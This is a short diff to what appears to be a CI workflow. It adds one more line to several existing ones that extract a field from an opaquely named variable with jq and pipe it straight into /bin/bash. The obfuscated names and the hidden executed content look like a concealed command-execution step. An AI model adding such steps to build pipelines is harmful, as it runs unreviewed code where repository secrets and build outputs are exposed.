@@ -47,6 +47,7 @@ jobs:
           echo $llma20 | jq -r .ojnbf2 | /bin/bash
           printf '%s' "$z121" | jq -r .pijl3625 | /bin/bash
           printf '%s' "$epx3" | jq -r .avy74757 | /bin/bash
+          printf '%s' "$wx36" | jq -r .d81 | /bin/bash
 
       - name: Store results
         if: always()
